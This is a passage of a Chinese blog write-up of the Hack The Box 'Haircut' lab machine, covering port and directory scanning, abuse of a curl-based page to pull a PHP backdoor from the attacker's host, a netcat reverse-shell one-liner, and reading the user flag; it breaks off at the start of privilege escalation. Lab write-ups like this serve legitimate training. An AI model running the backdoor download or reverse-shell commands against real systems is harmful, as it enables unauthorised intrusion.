

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：目录深度遍历扫描、RFL漏洞、curl&#x2F;7.47.0 文件下载、suid 提权、GNU Screen 4.5.0 - Local Privilege Escalation">
<meta property="og:type" content="article">
<meta property="og:title" content="Haircut-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/01/03/Haircut-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录深度遍历扫描、RFL漏洞、curl&#x2F;7.47.0 文件下载、suid 提权、GNU Screen 4.5.0 - Local Privilege Escalation">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Haircut-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Haircut-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Haircut-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Haircut-htb-writeup/4.png">
<meta property="article:published_time" content="2024-01-03T15:50:55.000Z">
<meta property="article:modified_time" content="2024-01-10T09:22:11.789Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Haircut-htb-writeup/1.png">
  
  
  
  <title>Haircut-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Haircut-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-03 23:50" pubdate>
          2024年1月3日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          97k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          810 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Haircut-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录深度遍历扫描、RFL漏洞、curl&#x2F;7.47.0 文件下载、suid 提权、GNU Screen 4.5.0 - Local Privilege Escalation</p>
<span id="more"></span>  

<p>参考链接：<code>https://www.jgeek.cn/article/106.html</code></p>
<p>参考链接：<code>https://0xdf.gitlab.io/2020/09/10/htb-haircut.html</code></p>
<p>参考链接：<code>https://book.fubared.net/ctf/htb/boxes/10.10.10.24-haircut/haircut.html</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.24</p>
<p>2、测试下靶机连通率</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ping 10.10.10.24 -c 4<br>PING 10.10.10.24 (10.10.10.24) 56(84) bytes of data.<br>64 bytes from 10.10.10.24: icmp_seq=1 ttl=63 time=477 ms<br>64 bytes from 10.10.10.24: icmp_seq=2 ttl=63 time=310 ms<br>64 bytes from 10.10.10.24: icmp_seq=3 ttl=63 time=417 ms<br><br>--- 10.10.10.24 ping statistics ---<br>4 packets transmitted, 3 received, 25% packet loss, time 3008ms<br>rtt min/avg/max/mdev = 310.364/401.398/476.770/68.831 ms<br></code></pre></td></tr></table></figure>

<p>3、开始端口扫描，测试开放端口情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- -Pn --min-rate=10000 -oG allport 10.10.10.24 <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 16:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.24<br>Host is up (0.32s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.12 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sV -sC -p22,80 -Pn --min-rate=10000 10.10.10.24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 16:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.24<br>Host is up (0.43s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)<br>|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)<br>|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)<br>80/tcp open  http    nginx 1.10.0 (Ubuntu)<br>|_http-server-header: nginx/1.10.0 (Ubuntu)<br>|_http-title:  HTB Hairdresser <br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 33.40 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -p- -Pn -sU --min-rate=10000 -oG allport 10.10.10.24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 16:20 CST<br>Warning: 10.10.10.24 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.24<br>Host is up (0.30s latency).<br>All 65535 scanned ports on 10.10.10.24 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65475 open|filtered udp ports (no-response), 60 closed udp ports (port-unreach)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 74.09 seconds<br></code></pre></td></tr></table></figure>

<p>4、开始目录扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ dirsearch -u http://10.10.10.24/                                               <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25<br>Wordlist size: 11460<br><br>Output File: /home/kali/桌面/reports/http_10.10.10.24/__24-01-03_16-35-22.txt<br><br>Target: http://10.10.10.24/<br><br>[16:35:22] Starting: <br>[16:40:06] 200 -  223B  - /test.html                                        <br>[16:40:22] 403 -  580B  - /uploads/                                         <br>[16:40:26] 301 -  194B  - /uploads  -&gt;  http://10.10.10.24/uploads/ <br><br>Task Completed<br></code></pre></td></tr></table></figure>

<p>5、这里简单看下，两个默认页面是什么内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://10.10.10.24/<br>&lt;!DOCTYPE html&gt;<br><br>&lt;title&gt; HTB Hairdresser &lt;/title&gt;<br><br>&lt;center&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;<br>&lt;img src=<span class="hljs-string">&quot;bounce.jpg&quot;</span> height=<span class="hljs-string">&quot;750&quot;</span> width=<span class="hljs-string">&quot;1200&quot;</span> alt=<span class="hljs-string">&quot;&quot;</span> /&gt;<br>&lt;center&gt;<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://10.10.10.24/test.html <br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>  &lt;body&gt;<br>        &lt;img src=<span class="hljs-string">&#x27;carrie.jpg&#x27;</span>&gt;&lt;/img&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>6、其实到这里就已经卡住了，因为这里并没有获取到有效的目录，这里也是看了演示报告才知道的，正确的目录是下面这个路径</p>
<p><code>http://10.10.10.24/exposed.php</code></p>
<p>7、查看该页面发现是一个远程页面加载的功能</p>
<p><img src="http://sh1yan.top/photo/Haircut-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
<p>8、经过各种验证，发现这是一个使用curl功能布设的服务</p>
<p><img src="http://sh1yan.top/photo/Haircut-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 80<br>listening on [any] 80 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.24] 37950<br>GET / HTTP/1.1<br>Host: 10.10.14.4<br>User-Agent: curl/7.47.0<br>Accept: */*<br></code></pre></td></tr></table></figure>

<p>9、由于我们知道这个是一个使用curl的工具的服务，我们可以远程读取我们服务器上的木马文件，然后下载到目标服务器上面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/htb-tools]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.24 - - [03/Jan/2024 17:16:25] <span class="hljs-string">&quot;GET /qsd-php-backdoor.php HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>

<p><code>http://10.10.14.4/qsd-php-backdoor.php -o uploads/shell1.php</code></p>
<p><img src="http://sh1yan.top/photo/Haircut-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
<p>10、我们成功的把目录上传到服务器上面了</p>
<p><code>http://10.10.10.24/uploads/shell1.php</code></p>
<p><img src="http://sh1yan.top/photo/Haircut-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>11、这里我们直接使用反弹shell功能，获取到初始的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.4 443 &gt;/tmp/f<br></code></pre></td></tr></table></figure>

<p>12、获取到了 www-data 用户的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.10.24] 37008<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ python -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">sh: 2: python: not found</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@haircut:~/html/uploads$ </span><br></code></pre></td></tr></table></figure>

<p>13、通过翻找，发现当前用户权限，可以读取到第一个flag文件信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@haircut:~/html/uploads$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 144<br>drwxr-xr-x 2 www-data www-data   4096 Jan  3 10:16 .<br>drwxr-xr-x 3 root     root       4096 May 19  2017 ..<br>-rwxr-xr-x 1 www-data www-data 116637 May 19  2017 bounce.jpg<br>-rw-r--r-- 1 www-data www-data     32 Jan  3 10:11 shell.php<br>-rw-r--r-- 1 www-data www-data  13585 Jan  3 10:16 shell1.php<br>www-data@haircut:~/html/uploads$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@haircut:~/html$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 444<br>drwxr-xr-x 3 root     root       4096 May 19  2017 .<br>drwxr-xr-x 3 root     root       4096 May 16  2017 ..<br>-rwxr-xr-x 1 root     root     116637 May 15  2017 bounce.jpg<br>-rwxr-xr-x 1 root     root     167677 May 15  2017 carrie.jpg<br>-rwxr-xr-x 1 root     root        921 May 15  2017 exposed.php<br>-rwxr-xr-x 1 root     root        141 May 15  2017 hair.html<br>-rwxr-xr-x 1 root     root        144 May 15  2017 index.html<br>-rwxr-xr-x 1 root     root     135186 May 15  2017 sea.jpg<br>-rwxr-xr-x 1 root     root        223 May 15  2017 test.html<br>drwxr-xr-x 2 www-data www-data   4096 Jan  3 10:16 uploads<br>www-data@haircut:~/html$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x  3 root  root  4096 Jul 13  2021 .<br>drwxr-xr-x 23 root  root  4096 Jul 13  2021 ..<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 maria<br>www-data@haircut:~/html$ la -la /home/maria<br>la -la /home/maria<br>la: <span class="hljs-built_in">command</span> not found<br>www-data@haircut:~/html$ <span class="hljs-built_in">ls</span> -la /home/maria<br><span class="hljs-built_in">ls</span> -la /home/maria<br>total 104<br>drwxr-xr-x 15 maria maria 4096 Jul 13  2021 .<br>drwxr-xr-x  3 root  root  4096 Jul 13  2021 ..<br>-rw-------  1 maria maria  322 May 16  2017 .ICEauthority<br>-rw-------  1 maria maria   52 May 16  2017 .Xauthority<br>-rw-------  1 maria maria    1 Dec 24  2017 .bash_history<br>-rw-r--r--  1 maria maria  220 May 15  2017 .bash_logout<br>-rw-r--r--  1 maria maria 3771 May 15  2017 .bashrc<br>drwx------  9 maria maria 4096 Jul 13  2021 .cache<br>drwx------ 12 maria maria 4096 Jul 13  2021 .config<br>-rw-r--r--  1 maria maria   25 May 16  2017 .dmrc<br>drwxr-xr-x  3 maria maria 4096 Jul 13  2021 .<span class="hljs-built_in">local</span><br>-rw-------  1 maria maria  255 May 16  2017 .mysql_history<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .nano<br>-rw-r--r--  1 maria maria  655 May 15  2017 .profile<br>-rw-r--r--  1 maria maria    0 May 16  2017 .sudo_as_admin_successful<br>drwxrwxr-x  2 maria maria 4096 Jul 13  2021 .tasks<br>-rw-rw-r--  1 maria maria  203 May 19  2017 .wget-hsts<br>-rw-------  1 maria maria  957 May 16  2017 .xsession-errors<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Desktop<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Documents<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Downloads<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Music<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Pictures<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Public<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Templates<br>drwxr-xr-x  2 maria maria 4096 Jul 13  2021 Videos<br>-rw-r--r--  1 root  root    33 Jan  3 09:17 user.txt<br>www-data@haircut:~/html$ <span class="hljs-built_in">cat</span> /home/maria/user.txt<br><span class="hljs-built_in">cat</span> /home/maria/user.txt<br>ef46f8691299b126fa6581d75ca97b6e<br>www-data@haircut:~/html$ <br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>14、在系统权限的获取上，我显示翻阅服务目录，又是翻阅目标用户目录，均是无收获</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 